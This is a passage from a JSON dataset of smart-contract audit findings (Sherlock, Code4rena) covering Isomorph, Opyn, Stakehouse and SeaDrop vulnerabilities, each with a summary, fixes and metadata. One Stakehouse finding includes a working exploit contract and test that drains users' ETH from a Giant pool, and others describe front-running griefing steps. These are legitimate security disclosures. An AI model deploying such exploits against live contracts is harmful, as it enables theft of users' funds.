      "summary": "\nThis bug report discusses an issue where a malicious user can steal rewards from other users by withdrawing their Velo Deposit NFTs from other users' depositors. This vulnerability exists because the `Depositor#withdrawFromGauge` allows any user to withdraw any NFT that was minted by the same `DepositReciept`. This means that a malicious user can deposit to their `Depositor` then withdraw their NFT through the `Depositor` of another user's `Depositor` that uses the same `DepositReciept`. The net effect is that the tokens will remained staked to the attackers `Depositor` allowing them to steal all the other user's rewards. To fix this issue, the code was changed to add checks on lines 82 and 123 that validate any depositReceipt being withdrawn was originally minted by that Depositor contract.",
      "report_date": {},
      "contest_prize_txt": "50000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/22",
      "sponsor_name": "Isomorph",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/51",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "22",
      "slug": "h-7-user-can-steal-rewards-from-other-users-by-withdrawing-their-velo-deposit-nfts-from-other-users-depositors-sherlock-isomorph-isomorph-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Isomorph",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Isomorph",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Privacy"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Business Logic"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "5649",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 23,
      "protocol_id": "92",
      "title": "H-4: Orders from other market makers can be invalidated",
      "content": "Source: https://github.com/sherlock-audit/2022-11-opyn-judging/issues/6 \n\n## Found by \nbin2chen, hyh, hansfriese, aviggiano, caventa, thec00n, indijanc, rotcivegaf, kaliberpoziomka, chainNue, John, adriro, Atarpara, cccz, \\_\\_141345\\_\\_, Haruxe, zimu, minhtrng, HonorLt, ctf\\_sec, imare, reassor, jonatascm\n\n## Summary\nThe `checkOrder()` function performs verification of pre-signed orders. This function allows anyone to set the status of an order as used by storing the nonce contained in the order. Orders and their respective nonce can only be used once.  \n\n## Vulnerability Detail\nThe `_useNonce()` function is called as called as part of the `checkOrder()` function. It checks that the nonce of a trader has not already been used, marks the nonce as used and performs other order verification checks. Orders and their respective nonce are also checked by the same implementation as part of the auction functions `withdrawAuction()` and `depositAuction()`. An order that has been invalidated once can not be used anymore and by calling `checkOrder()` any user can invalidate existing orders. \n\n## Impact\nA malicious user could perform a grieving attack and invalidate any presigned orders by monitoring the mempool and front run any orders that are submitted to `withdrawAuction()` and `depositAuction()` and send them to `checkOrder()`. One invalidated order can cause the auction functions to fail.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-opyn/blob/main/crab-netting/src/CrabNetting.sol#L447-L476\n\nhttps://github.com/sherlock-audit/2022-11-opyn/blob/main/crab-netting/src/CrabNetting.sol#L756-L759\n\n## Tool used\nManual Review\n\n## Recommendation\n1.) Change the `checkOrder()` and `_checkOrder()` to a view function \n2.) Remove `_useNonce()` from `_checkOrder()`\n3.) Use `_useNonce()` and `_checkOrder()` in `withdrawAuction()` and `depositAuction()`\n\n## Discussion\n\n**sanandnarayan**\n\nfix https://github.com/opynfinance/squeeth-monorepo/pull/806\n\n**thec00n**\n\nFix lgtm.\n\n**SecurityDat**\n\nEscalate for 10 USDC\n\nI have two issues classfied to https://github.com/sherlock-audit/2022-11-opyn-judging/issues/60. I think one of them (https://github.com/sherlock-audit/2022-11-opyn-judging/issues/51) is exactly about this issue https://github.com/sherlock-audit/2022-11-opyn-judging/issues/6.\n\nPlease rejudge https://github.com/sherlock-audit/2022-11-opyn-judging/issues/51. It is about submitting calls to `checkorder()` to make orders from other market makers invalid.\n\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> I have two issues classfied to https://github.com/sherlock-audit/2022-11-opyn-judging/issues/60. I think one of them (https://github.com/sherlock-audit/2022-11-opyn-judging/issues/51) is exactly about this issue https://github.com/sherlock-audit/2022-11-opyn-judging/issues/6.\n> \n> Please rejudge https://github.com/sherlock-audit/2022-11-opyn-judging/issues/51. It is about submitting calls to `checkorder()` to make orders from other market makers invalid.\n> \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**kaliberpoziomka**\n\nEscalate for 10 USDC\nThe issue #132 I've submitted was classified to #60. I think it is this issue #6.\nPlease rejudge #132, since it is about function `checkOrder(....)` marking nonces as used.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> The issue #132 I've submitted was classified to #60. I think it is this issue #6.\n> Please rejudge #132, since it is about function `checkOrder(....)` marking nonces as used.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue with the `checkOrder()` function, which is used to verify pre-signed orders. It was discovered by a group of users and is classified as Issue H-4. The `checkOrder()` function allows anyone to set the status of an order as used by storing the nonce contained in the order, and orders and their respective nonce can only be used once. The `_useNonce()` function is called as part of the `checkOrder()` function to check that the nonce of a trader has not already been used, mark the nonce as used and perform other order verification checks. \n\nThe vulnerability is that orders and their respective nonce are also checked by the same implementation as part of the auction functions `withdrawAuction()` and `depositAuction()`. A malicious user could perform a grieving attack and invalidate any presigned orders by monitoring the mempool and front run any orders that are submitted to `withdrawAuction()` and `depositAuction()` and send them to `checkOrder()`. One invalidated order can cause the auction functions to fail. \n\nCode snippets are provided for the affected functions. The issue was manually reviewed using tools. Recommendations are provided to fix the issue, such as changing the `checkOrder()` and `_checkOrder()` to a view function, removing `_useNonce()` from `_checkOrder()` and using `_useNonce()` and `_checkOrder()` in `withdrawAuction()` and `depositAuction()`. Escalations were made for 10 USDC and accepted by sherlock-admin. Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "report_date": {},
      "contest_prize_txt": "25000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/26",
      "sponsor_name": "Opyn",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-opyn-judging/issues/6",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "26",
      "slug": "h-4-orders-from-other-market-makers-can-be-invalidated-sherlock-opyn-opyn-crab-netting-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Opyn Crab Netting",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Opyn Crab Netting",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "5932",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "106",
      "title": "[M-24] Node runner who is already known to be malicious cannot be banned before corresponding smart wallet is created",
      "content": "\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492>\n\nCurrently, the `rotateNodeRunnerOfSmartWallet` function provides the only way to set `bannedNodeRunners` to `true` for a malicious node runner. However, before the node runner calls the `registerBLSPublicKeys` function to create a smart wallet, calling the `rotateNodeRunnerOfSmartWallet` function reverts. This means that for a node runner, who is already known to be malicious such as someone controlling a hacker address, calling the `isNodeRunnerBanned` function always return `false` before the `registerBLSPublicKeys` function is called for the first time, and executing `require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\")` when calling the `registerBLSPublicKeys` function for the first time is not effective. As the monitoring burden can be high, the malicious node runner could interact with the protocol maliciously for a while already after the `registerBLSPublicKeys` function is called until the DAO notices the malicious activities and then calls the `rotateNodeRunnerOfSmartWallet` function. When the DAO does not react promptly, some damages to the protocol could be done already.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377>\n\n```solidity\n    function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {\n        ...\n\n        if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {\n            bannedNodeRunners[_current] = true;\n            emit NodeRunnerBanned(_current);\n        }\n\n        ...\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509>\n\n```solidity\n    function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {\n        return bannedNodeRunners[_nodeRunner];\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492>\n\n```solidity\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable nonReentrant {\n        ...\n        require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n\n        if(smartWallet == address(0)) {\n            // create new wallet owned by liquid staking manager\n            smartWallet = smartWalletFactory.createWallet(address(this));\n            emit SmartWalletCreated(smartWallet, msg.sender);\n\n            // associate node runner with the newly created wallet\n            smartWalletOfNodeRunner[msg.sender] = smartWallet;\n            nodeRunnerOfSmartWallet[smartWallet] = msg.sender;\n\n            _authorizeRepresentative(smartWallet, _eoaRepresentative, true);\n        }\n\n        ...\n    }\n```\n\n### Proof of Concept\n\nPlease add the following test in `test\\foundry\\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testMaliciousNodeRunnerCannotBeBannedBeforeCorrespondingSmartWalletIsCreated() public {\n        vm.prank(address(factory));\n        manager.updateDAOAddress(admin);\n\n        // Simulate a situation where accountOne is known to be malicious already.\n        // accountOne is not banned at this moment.\n        assertEq(manager.bannedNodeRunners(accountOne), false);\n\n        // Calling the rotateNodeRunnerOfSmartWallet function is the only way to ban accountOne;\n        //   however, calling it reverts because accountOne has not called the registerBLSPublicKeys function to create a smart wallet yet.\n        // This means that it is not possible to prevent accountOne from interacting with the protocol until her or his smart wallet is created.\n        vm.prank(admin);\n        vm.expectRevert(\"Wallet does not exist\");\n        manager.rotateNodeRunnerOfSmartWallet(accountOne, accountTwo, true);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nA function, which should be only callable by the DAO, that can directly set `bannedNodeRunners` for a node runner can be added.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Liquid Staking Manager (LSM) contract of the 2022-11-stakehouse project. The vulnerability allows malicious node runners to interact with the protocol without being banned. This is because the `rotateNodeRunnerOfSmartWallet` function, which is the only way to set `bannedNodeRunners` to `true` for a malicious node runner, reverts before the node runner calls the `registerBLSPublicKeys` function to create a smart wallet. This means that for a node runner, who is already known to be malicious, calling the `isNodeRunnerBanned` function always returns `false` before the `registerBLSPublicKeys` function is called for the first time, and executing `require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\")` when calling the `registerBLSPublicKeys` function for the first time is not effective.\n\nThe proof of concept of this vulnerability is a test in `test\\foundry\\LSDNFactory.t.sol`, which simulates a situation where an account is known to be malicious already and is not banned at that moment. The test demonstrates that calling the `rotateNodeRunnerOfSmartWallet` function reverts because the malicious node runner has not called the `registerBLSPublicKeys` function to create a smart wallet yet.\n\nThe recommended mitigation steps for this vulnerability is to add a function, which should be only callable by the DAO, that can directly set `bannedNodeRunners` for a node runner. This would prevent malicious node runners from interacting with the protocol before their smart wallet is created.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
      "sponsor_name": "Stakehouse Protocol",
      "sponsor_link": "https://twitter.com/blockswap_team",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2022-11-stakehouse",
      "github_link": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "182",
      "slug": "m-24-node-runner-who-is-already-known-to-be-malicious-cannot-be-banned-before-corresponding-smart-wallet-is-created-code4rena-stakehouse-protocol-lsd-network-stakehouse-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Stakehouse Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Stakehouse Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "5920",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "106",
      "title": "[M-12] Attacker can grift syndicate staking by staking a small amount",
      "content": "\n<https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L882><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/23c3cf65975cada7fd2255a141b359a6b31c2f9c/contracts/syndicate/Syndicate.sol#L22>\n\n`LiquidStakingManager._autoStakeWithSyndicate` always stakes a fixed amount of 12 ETH. However, `Syndicate.stake` only allows a total staking amount of 12 ETH and reverts otherwise:\n\n```solidity\nif (_sETHAmount + totalStaked > 12 ether) revert InvalidStakeAmount();\n```\n\nAn attacker can abuse this and front-run calls to `mintDerivatives` (which call `_autoStakeWithSyndicate` internally). Because `Syndicate.stake` can be called by everyone, he can stake the minimum amount (1 gwei) such that the `mintDerivatives` call fails.\n\n### Proof Of Concept\n\nAs soon as there is a `mintDerivatives` call in the mempool, an attacker (that owns sETH) calls `Syndicate.stake` with an amount of 1 gwei. `_autoStakeWithSyndicate` will still call `Syndicate.stake` with 12 ether. However, `_sETHAmount + totalStaked > 12 ether` will then be true, meaning that the call will revert.\n\n### Recommended Mitigation Steps\n\nOnly allow staking through the LiquidStakingManager, i.e. add access control to `Syndicate.stake`.\n\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146#issuecomment-1329482113)**\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LiquidStakingManager and Syndicate contracts in the code-423n4/2022-11-stakehouse repository on GitHub. The vulnerability allows an attacker to front-run calls to the mintDerivatives function, which calls the _autoStakeWithSyndicate function internally. The _autoStakeWithSyndicate function always stakes a fixed amount of 12 ETH, but the Syndicate.stake function only allows a total staking amount of 12 ETH and reverts otherwise. By calling the Syndicate.stake function with an amount of 1 gwei, the attacker can make _sETHAmount + totalStaked > 12 ether, which results in the call reverting. \n\nThe recommended mitigation step to fix this vulnerability is to only allow staking through the LiquidStakingManager, by adding access control to the Syndicate.stake function.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
      "sponsor_name": "Stakehouse Protocol",
      "sponsor_link": "https://twitter.com/blockswap_team",
      "quality_score": 4,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-11-stakehouse",
      "github_link": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "182",
      "slug": "m-12-attacker-can-grift-syndicate-staking-by-staking-a-small-amount-code4rena-stakehouse-protocol-lsd-network-stakehouse-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Stakehouse Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Stakehouse Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        },
        {
          "tags_tag": {
            "title": "Front-Running"
          }
        }
      ]
    },
    {
      "id": "5904",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 22,
      "protocol_id": "106",
      "title": "[H-17] Giant pools can be drained due to weak vault authenticity check",
      "content": "\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44>\n\nAn attacker can withdraw all ETH staked by users in a Giant pool. Both `GiantSavETHVaultPool` and `GiantMevAndFeesPool` are affected.\n\n### Proof of Concept\n\nThe `batchDepositETHForStaking` function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)):\n\n```solidity\nSavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\nrequire(\n    liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n    \"Invalid liquid staking manager\"\n);\n\n// Deposit ETH for staking of BLS key\nsavETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n    _blsPublicKeys[i],\n    _stakeAmounts[i]\n);\n```\n\nAn attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:\n\n```solidity\n// test/foundry/GiantPools.t.sol\ncontract GiantPoolExploit {\n    address immutable owner = msg.sender;\n    address validStakingManager;\n\n    constructor(address validStakingManager_) {\n        validStakingManager = validStakingManager_;\n    }\n\n    function liquidStakingManager() public view returns (address) {\n        return validStakingManager;\n    }\n\n    function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {\n        payable(owner).transfer(address(this).balance);\n    }\n}\n\nfunction testPoolDraining_AUDIT() public {\n    // Register BLS key\n    address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n    // Set up users and ETH\n    address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n\n    address attacker = address(0x1337);\n    vm.label(attacker, \"attacker\");\n    vm.deal(attacker, 1 ether);\n\n    // User deposits ETH into Giant savETH\n    vm.prank(savETHUser);\n    giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n    assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n    assertEq(address(giantSavETHPool).balance, 24 ether);\n\n    // Attacker deploys an exploit.\n    vm.startPrank(attacker);\n    GiantPoolExploit exploit = new GiantPoolExploit(address(manager));\n    vm.stopPrank();\n\n    // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.\n    bytes[][] memory blsKeysForVaults = new bytes[][](1);\n    blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n    uint256[][] memory stakeAmountsForVaults = new uint256[][](1);\n    stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n    giantSavETHPool.batchDepositETHForStaking(\n        getAddressArrayFromValues(address(exploit)),\n        getUint256ArrayFromValues(24 ether),\n        blsKeysForVaults,\n        stakeAmountsForVaults\n    );\n\n    // Vault got nothing.\n    assertEq(address(manager.savETHVault()).balance, 0 ether);\n    // Attacker has stolen user's deposit.\n    assertEq(attacker.balance, 25 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider taking a list of `LiquidStakingManager` addresses instead of vault addresses:\n\n```diff\n--- a/contracts/liquid-staking/GiantSavETHVaultPool.sol\n+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol\n@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n     /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding\n     /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding\n     function batchDepositETHForStaking(\n-        address[] calldata _savETHVaults,\n+        address[] calldata _liquidStakingManagers,\n         uint256[] calldata _ETHTransactionAmounts,\n         bytes[][] calldata _blsPublicKeys,\n         uint256[][] calldata _stakeAmounts\n     ) public {\n-        uint256 numOfSavETHVaults = _savETHVaults.length;\n+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;\n         require(numOfSavETHVaults > 0, \"Empty arrays\");\n         require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");\n         require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\");\n@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n\n         // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator\n         for (uint256 i; i < numOfSavETHVaults; ++i) {\n+            require(\n+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),\n+                \"Invalid liquid staking manager\"\n+            );\n+\n             uint256 transactionAmount = _ETHTransactionAmounts[i];\n\n             // As ETH is being deployed to a savETH pool vault, it is no longer idle\n             idleETH -= transactionAmount;\n\n-            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\n-            require(\n-                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n-                \"Invalid liquid staking manager\"\n-            );\n+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));\n+            SavETHVault savETHPool = liquidStakingManager.savETHVault();\n\n             // Deposit ETH for staking of BLS key\n             savETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251#issuecomment-1329428177)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the GiantSavETHVaultPool and GiantMevAndFeesPool contracts, which form part of the Stakehouse project. The vulnerability allows an attacker to withdraw all ETH staked by users in a Giant pool. \n\nThe vulnerability is caused by a check in the `batchDepositETHForStaking` function in the Giant pools. This function checks whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes. An attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract.\n\nThe recommended mitigation step is to consider taking a list of `LiquidStakingManager` addresses instead of vault addresses. This would prevent the exploit contract from being able to return a valid staking manager contract address.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
      "sponsor_name": "Stakehouse Protocol",
      "sponsor_link": "https://twitter.com/blockswap_team",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2022-11-stakehouse",
      "github_link": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "182",
      "slug": "h-17-giant-pools-can-be-drained-due-to-weak-vault-authenticity-check-code4rena-stakehouse-protocol-lsd-network-stakehouse-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Stakehouse Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Stakehouse Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "6845",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "MEDIUM",
      "finders_count": 3,
      "protocol_id": "113",
      "title": "owner can reset feeBps set byadmin for token gated drops",
      "content": "## Medium Risk Report\n\n**Severity:** Medium Risk  \n**Context:** \n- ERC721SeaDrop.sol#L233-L245\n- SeaDrop.sol#L860\n- SeaDrop.sol#L889-L890  \n\n**Description:**  \nOnly the admin can call `updateTokenGatedDropFee` to update `feeBps`. However, the owner can call `updateTokenGatedDrop(address seaDropImpl, address allowedNftToken, TokenGatedDropStage calldata dropStage)` twice afterward to reset the `feeBps` to 0 for a drop.\n\n1. Once with `dropStage.maxTotalMintableByWallet` equal to 0 to wipe out the storage on the SeaDrop side.\n2. Then with the same `allowedNftToken` address and the other desired parameters, which would retrieve the previously wiped out drop stage data (with `feeBps` equal to 0).\n\n**NOTE:** This type of attack does not apply to `updatePublicDrop` and `updatePublicDropFee` pair, since `updatePublicDrop` cannot remove or update the `feeBps`. Once `updatePublicDropFee` is called with a specific `feeBps`, that value remains for this ERC721SeaDrop contract-related storage on SeaDrop (`_publicDrops[msg.sender] = publicDrop`). Any number of consecutive calls to `updatePublicDrop` with any parameters cannot change the already set `feeBps`.\n\n**Recommendation:**  \nThe admins could monitor all activities for `updateTokenGatedDrop` calls even when the same old `allowedNftToken` is used and make sure to set the fees after each call if it is not a removal kind.\n\n**OpenSea Proposal:**  \nWe can rework it so that `updateTokenGatedDropFee` \"initializes\" a TokenGatedDrop stage (setting all params to 0 besides `feeBps` and `restrictFeeRecipients`), allowing a partner to then edit other params and delete the stage, but not create a new one. This would be a workaround for the current issues.\n\n## Proposed Workaround:\n- Administrator/OpenSea is the only authorized user that can \"initialize\" a TokenGatedDrop. Initializing a token-gated drop sets all params to zero except `maxTotalMintableByWallet = 1` (the struct will not be stored if == 0), `feeBps`, and `restrictFeeRecipients = true`.\n- The parameter `startTime = 0` means the stage will not be active and cannot be made active by OpenSea.\n- The Owner/Partner can then update the initialized TokenGatedDrop stage (potentially including delete, if so desired, but it would need to be re-initialized with a fee by OpenSea).",
